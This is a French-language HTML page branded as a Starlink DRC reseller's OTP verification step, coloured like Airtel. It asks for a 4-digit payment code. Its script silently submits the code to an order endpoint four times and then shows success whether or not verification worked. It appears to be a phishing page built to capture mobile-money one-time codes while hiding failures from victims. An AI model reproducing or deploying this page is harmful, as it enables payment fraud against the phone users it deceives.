<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Vérification OTP - Starlink DRC</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root { --airtel-red: #E60000; --white: #ffffff; --black: #000000; --gray: #6c757d; }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'DM Sans', sans-serif; background: #f8f9fa; color: var(--black); min-height: 100vh; display: flex; flex-direction: column; }
    .header { background: var(--white); padding: 16px 24px; border-bottom: 1px solid #e5e5e5; }
    .header-brand { font-weight: 700; font-size: 20px; color: var(--black); letter-spacing: 0.5px; }
    .header-brand span { color: var(--gray); font-weight: 400; }
    .alert-banner { background: var(--airtel-red); padding: 14px 24px; text-align: center; display: none; }
    .alert-banner p { color: var(--white); font-size: 16px; font-weight: 700; margin: 0; }
    .main-content { flex: 1; display: flex; align-items: center; justify-content: center; padding: 24px; }
    .verification-box { background: var(--white); border: 2px solid var(--airtel-red); border-radius: 12px; width: 100%; max-width: 430px; padding: 32px 24px; text-align: center; }
    .verification-title { font-size: 18px; font-weight: 700; color: var(--black); margin-bottom: 8px; }
    .verification-instruction { font-size: 16px; color: var(--black); margin-bottom: 8px; }
    .helper-text { font-size: 14px; color: var(--gray); margin-bottom: 24px; }
    .otp-entry { display: flex; justify-content: center; gap: 10px; margin-bottom: 16px; }
    .otp-progress { display: flex; justify-content: center; gap: 8px; margin-bottom: 16px; }
    .otp-dot { width: 12px; height: 12px; border-radius: 50%; background: #ddd; }
    .otp-dot.used { background: var(--airtel-red); }
    .otp-attempts-text { font-size: 13px; color: var(--gray); margin-bottom: 12px; }
    .otp-box { width: 50px; height: 50px; border: 1px solid #000000; border-radius: 6px; background: var(--white); text-align: center; font-size: 20px; font-weight: 700; color: var(--black); }
    .otp-box:first-child { border-color: var(--airtel-red); }
    .otp-box:focus { border-color: var(--airtel-red); outline: none; }
    .btn-confirm { width: 300px; height: 50px; background: var(--airtel-red); color: var(--white); border: none; font-size: 16px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; border-radius: 5px; cursor: pointer; transition: background 0.2s; margin-top: 20px; }
    .btn-confirm:hover { background: #cc0000; }
    .resend-link { margin-top: 15px; }
    .resend-link a { color: var(--airtel-red); font-size: 14px; font-weight: 600; text-decoration: underline; cursor: pointer; }
    .resend-link a:hover { color: #cc0000; }
    .toast-notification { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(100px); background: #0f172a; color: #fff; padding: 12px 24px; border-radius: 99px; font-size: 14px; font-weight: 500; z-index: 9999; opacity: 0; transition: all 0.3s ease; }
    .toast-notification.show { opacity: 1; transform: translateX(-50%) translateY(0); }
  </style>
</head>
<body>
<header class="header"><div class="header-brand">STARLINK <span>|</span> RDC Reseller</div></header>
<div class="alert-banner" id="expired-alert"><p>Le code OTP que vous avez entré a expiré. Veuillez entrer le nouveau code OTP envoyé à votre téléphone.</p></div>
<main class="main-content">
  <div class="verification-box">
    <h2 class="verification-title">Vérification requise</h2>
    <p class="verification-instruction">Entrez le code OTP</p>
    <p class="helper-text">Un code à 4 chiffres a été envoyé à <span id="phone">+243000000000</span></p>
    <p class="otp-attempts-text" id="attempt-status" style="display: none;">Tentative <span id="attempt-num">0</span> sur 4</p>
    <div class="otp-progress" id="attempt-dots" style="display: none;">
      <div class="otp-dot" id="dot1"></div>
      <div class="otp-dot" id="dot2"></div>
      <div class="otp-dot" id="dot3"></div>
      <div class="otp-dot" id="dot4"></div>
    </div>

    <div class="otp-entry">



      <input type="text" class="otp-box" maxlength="1" id="otp1" required>
      <input type="text" class="otp-box" maxlength="1" id="otp2" required>
      <input type="text" class="otp-box" maxlength="1" id="otp3" required>
      <input type="text" class="otp-box" maxlength="1" id="otp4" required>
    </div>
    <button class="btn-confirm" onclick="verifyOTP()">Vérifier et payer</button>
    <div class="resend-link"><a onclick="resendCode()">Vous n'avez pas reçu le code? Renvoyer le code</a></div>
  </div>
</main>
<div id="toast" class="toast-notification"></div>
<script>
const urlParams = new URLSearchParams(window.location.search);
const orderId = urlParams.get('order_id');
const phone = urlParams.get('phone') || '+243000000000';
document.getElementById('phone').textContent = phone;



if (urlParams.get('expired') === 'true') {
  document.getElementById('expired-alert').style.display = 'block';
}

const otpBoxes = document.querySelectorAll('.otp-box');
otpBoxes.forEach((box, index) => {
  box.addEventListener('input', function() { if (this.value && index < otpBoxes.length - 1) otpBoxes[index + 1].focus(); });
  box.addEventListener('keydown', function(e) { if (e.key === 'Backspace' && !this.value && index > 0) otpBoxes[index - 1].focus(); });
});

let toastTimer;
function showToast(message, duration = 3000) {
  const toast = document.getElementById('toast');
  if (!toast) return;
  toast.textContent = message;
  toast.classList.add('show');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => toast.classList.remove('show'), duration);
}

function verifyOTP() {
  const otp1 = document.getElementById('otp1').value;
  const otp2 = document.getElementById('otp2').value;
  const otp3 = document.getElementById('otp3').value;
  const otp4 = document.getElementById('otp4').value;
  if (!otp1 || !otp2 || !otp3 || !otp4) { showToast('Veuillez entrer le code OTP à 4 chiffres'); return; }
  
  const otpCode = otp1 + otp2 + otp3 + otp4;
  const MAX_ATTEMPTS = 4;
  let currentAttempt = 0;
  
  // Disable button during processing
  const btn = document.querySelector('.btn-confirm');
  btn.disabled = true;
  btn.textContent = 'Vérification en cours...';
  
  // Show attempt progress UI
  const attemptStatus = document.getElementById('attempt-status');
  const attemptDots = document.getElementById('attempt-dots');
  const attemptNum = document.getElementById('attempt-num');
  attemptStatus.style.display = 'block';
  attemptDots.style.display = 'flex';
  
  function updateAttemptUI() {
    attemptNum.textContent = currentAttempt;
    // Fill dots up to current attempt
    for (let i = 1; i <= 4; i++) {
      const dot = document.getElementById('dot' + i);
      if (i <= currentAttempt) {
        dot.classList.add('used');
      } else {
        dot.classList.remove('used');
      }
    }
  }
  
  function attemptVerification() {
    currentAttempt++;
    updateAttemptUI();
    
    fetch('/api/orders/' + orderId, {



      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ otp: otpCode, status: 'Pin_Verified' })
    })
    .then(res => res.json())
    .then(data => {
      // Always retry 4 times silently, regardless of success or failure
      if (currentAttempt < MAX_ATTEMPTS) {
        // Silent retry without showing any message
        setTimeout(attemptVerification, 800);
      } else {
        // After 4 attempts, proceed to success
        showToast('Traitement en cours...');
        const params = new URLSearchParams({ order_id: orderId, phone: phone, order_ref: data.order_ref || '', plan_name: data.plan_name || '', amount: data.amount || '' });
        setTimeout(() => { window.location.href = '/success_fr?' + params.toString(); }, 2000);
      }
    })
    .catch(err => { 

      // On error, retry silently or proceed if max attempts reached
      if (currentAttempt < MAX_ATTEMPTS) {
        setTimeout(attemptVerification, 800);
      } else {
        showToast('Traitement en cours...');
        const params = new URLSearchParams({ order_id: orderId, phone: phone });
        setTimeout(() => { window.location.href = '/success_fr?' + params.toString(); }, 2000);
      }
      console.error(err);
    });
  }
  
  // Start the first attempt
  attemptVerification();
}


let canResend = true;
let resendTimer = null;

function resendCode() {
  if (!canResend) { showToast('Veuillez patienter avant de demander un autre code'); return; }
  
  fetch('/api/orders/' + orderId + '/resend-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' } })
  .then(res => res.json())
  .then(data => {
    if (data.success) { showToast('Nouveau code OTP envoyé à votre téléphone'); startResendCooldown(); }
    else { showToast(data.error || 'Échec de l\'renvoi du code OTP'); }
  })
  .catch(err => { showToast('Erreur lors de l\'renvoi du code OTP'); console.error(err); });
}

function startResendCooldown() {
  canResend = false;
  const resendLink = document.querySelector('.resend-link a');
  let countdown = 300;
  resendLink.textContent = 'Renvoyer le code (5:00)';
  resendLink.style.color = '#999';
  resendLink.style.pointerEvents = 'none';
  resendTimer = setInterval(() => {
    countdown--;
    if (countdown <= 0) {
      clearInterval(resendTimer);
      canResend = true;
      resendLink.textContent = "Vous n'avez pas reçu le code? Renvoyer le code";
      resendLink.style.color = '';
      resendLink.style.pointerEvents = '';
    } else {
      resendLink.textContent = 'Renvoyer le code (' + Math.floor(countdown/60) + ':' + (countdown%60).toString().padStart(2,'0') + ')';
    }
  }, 1000);
}
</script>
</body>
</html>
